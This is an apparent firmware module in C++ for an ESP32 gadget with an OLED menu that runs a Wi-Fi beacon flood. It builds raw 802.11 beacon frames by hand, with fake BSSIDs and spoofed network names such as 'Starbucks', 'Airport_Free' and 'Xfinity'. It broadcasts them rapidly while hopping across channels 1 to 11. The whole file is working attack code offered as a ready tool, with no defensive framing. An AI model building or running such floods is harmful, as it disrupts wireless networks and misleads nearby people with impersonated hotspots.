#include "wifi_beacon_flood.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "pins.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <esp_wifi.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

bool beaconFloodRunning = false;
int beaconCount = 0;
int beaconMenuIndex = 0;
unsigned long lastBeacon = 0;
unsigned long lastDebug = 0;
int currentFloodChannel = 1;
unsigned long channelHopTime = 0;
const unsigned long CHANNEL_HOP_INTERVAL = 300;

const uint8_t BSSIDs[12][6] = {
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x01},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x02},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x03},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x04},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x05},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x06},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x07},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x08},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x09},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x0A},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x0B},
    {0x12, 0x34, 0x56, 0x78, 0x90, 0x0C}
};

const char* fakeSSIDs[] = {
    "Free_WiFi",
    "Public_Net",
    "Starbucks",
    "Airport_Free",
    "Hotel_Guest",
    "McDonalds",
    "Google_Fiber",
    "Xfinity",
    "Cafe_Net",
    "Library",
    "Campus",
    "Guest"
};

void sendBeacon(const char* ssid, int channel, int bssidIndex) {
    uint8_t packet[128];
    int idx = 0;
    
    packet[idx++] = 0x80;
    packet[idx++] = 0x00;
    packet[idx++] = 0x00;
    packet[idx++] = 0x00;
    
    for (int i = 0; i < 6; i++) packet[idx++] = 0xFF;
    for (int i = 0; i < 6; i++) packet[idx++] = BSSIDs[bssidIndex][i];
    for (int i = 0; i < 6; i++) packet[idx++] = BSSIDs[bssidIndex][i];
    
    packet[idx++] = 0x00;
    packet[idx++] = 0x00;
    
    uint64_t ts = esp_timer_get_time();
    packet[idx++] = (ts >> 0) & 0xFF;
    packet[idx++] = (ts >> 8) & 0xFF;
    packet[idx++] = (ts >> 16) & 0xFF;
    packet[idx++] = (ts >> 24) & 0xFF;
    packet[idx++] = (ts >> 32) & 0xFF;
    packet[idx++] = (ts >> 40) & 0xFF;
    packet[idx++] = (ts >> 48) & 0xFF;
    packet[idx++] = (ts >> 56) & 0xFF;
    
    packet[idx++] = 0x64;
    packet[idx++] = 0x00;
    packet[idx++] = 0x11;
    packet[idx++] = 0x00;
    
    uint8_t ssidLen = strlen(ssid);
    packet[idx++] = 0x00;
    packet[idx++] = ssidLen;
    memcpy(&packet[idx], ssid, ssidLen);
    idx += ssidLen;
    
    packet[idx++] = 0x01;
    packet[idx++] = 0x08;
    packet[idx++] = 0x82;
    packet[idx++] = 0x84;
    packet[idx++] = 0x8B;
    packet[idx++] = 0x96;
    packet[idx++] = 0x0C;
    packet[idx++] = 0x12;
    packet[idx++] = 0x18;
    packet[idx++] = 0x24;
    
    packet[idx++] = 0x03;
    packet[idx++] = 0x01;
    packet[idx++] = channel;
    
    packet[idx++] = 0x32;
    packet[idx++] = 0x04;
    packet[idx++] = 0x30;
    packet[idx++] = 0x48;
    packet[idx++] = 0x60;
    packet[idx++] = 0x6C;
    
    packet[idx++] = 0x05;
    packet[idx++] = 0x04;
    packet[idx++] = 0x00;
    packet[idx++] = 0x01;
    packet[idx++] = 0x00;
    packet[idx++] = 0x00;
    
    packet[idx++] = 0x07;
    packet[idx++] = 0x06;
    packet[idx++] = 'U';
    packet[idx++] = 'S';
    packet[idx++] = ' ';
    packet[idx++] = 1;
    packet[idx++] = 11;
    packet[idx++] = 1;
    
    packet[idx++] = 0x2A;
    packet[idx++] = 0x01;
    packet[idx++] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_STA, packet, idx, false);
}

void beaconFloodSetup() {
    beaconFloodRunning = false;
    beaconCount = 0;
    beaconMenuIndex = 0;
    currentFloodChannel = 1;
    clearPopup();
    
    Serial.println("\n📶 BEACON FLOOD");
    Serial.println("================================");
    
    WiFi.disconnect(true);
    delay(100);
    WiFi.mode(WIFI_STA);
    delay(100);
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    
    showPopupMessage("📶 Beacon Flood", "SELECT: Start", "12 Networks");
    delay(1500);
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawXBMP(56, 5, 16, 16, icon_wifi);
    CenteredStr(20, "Beacon Flood");
    CenteredStr(35, "SELECT: Start");
    CenteredStr(50, "12 Networks");
    CenteredStr(63, "BACK: Exit");
    u8g2.sendBuffer();
    
    Serial.println("✅ Ready - Press SELECT to start");
}

void drawBeaconFlood() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawXBMP(56, 0, 16, 16, icon_wifi);
    
    char buf[30];
    sprintf(buf, beaconFloodRunning ? "FLOODING" : "IDLE");
    CenteredStr(12, buf);
    u8g2.drawLine(0, 14, 128, 14);
    
    sprintf(buf, "Beacons: %d", beaconCount);
    CenteredStr(26, buf);
    
    sprintf(buf, "CH: %d", currentFloodChannel);
    CenteredStr(38, buf);
    
    sprintf(buf, "12 APs");
    CenteredStr(50, buf);
    
    CenteredStr(62, beaconFloodRunning ? "SEL:Stop" : "SEL:Start");
    
    u8g2.sendBuffer();
}

void beaconFloodLoop() {
    if (drawPopupIfActive()) {
        delay(50);
        return;
    }
    
    if (isButtonPressed(BTN_BACK)) {
        if (beaconFloodRunning) {
            beaconFloodRunning = false;
            esp_wifi_set_promiscuous(false);
        }
        exitModule();
        return;
    }
    
    if (isButtonPressed(BTN_SELECT)) {
        if (beaconFloodRunning) {
            beaconFloodRunning = false;
            esp_wifi_set_promiscuous(false);
            showPopupMessage("⏹️ Stopped", "", "");
            delay(800);
        } else {
            beaconFloodRunning = true;
            beaconCount = 0;
            currentFloodChannel = 1;
            
            esp_wifi_set_promiscuous(false);
            delay(50);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
            
            showPopupMessage("🔴 FLOODING!", "Open WiFi scanner", "");
            delay(1000);
        }
    }
    
    if (beaconFloodRunning) {
        unsigned long now = millis();
        
        if (now - channelHopTime > CHANNEL_HOP_INTERVAL) {
            channelHopTime = now;
            currentFloodChannel++;
            if (currentFloodChannel > 11) currentFloodChannel = 1;
            esp_wifi_set_channel(currentFloodChannel, WIFI_SECOND_CHAN_NONE);
        }
        
        if (now - lastBeacon > 20) {
            lastBeacon = now;
            
            for (int i = 0; i < 12; i++) {
                sendBeacon(fakeSSIDs[i], currentFloodChannel, i);
            }
            beaconCount += 12;
        }
    }
    
    drawBeaconFlood();
    delay(10);
}

void beaconFloodCleanup() {
    Serial.println("🧹 Beacon Flood cleanup...");
    
    if (beaconFloodRunning) {
        beaconFloodRunning = false;
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    beaconCount = 0;
    beaconMenuIndex = 0;
    currentFloodChannel = 1;
    clearPopup();
    
    Serial.println("✅ Cleanup complete");
}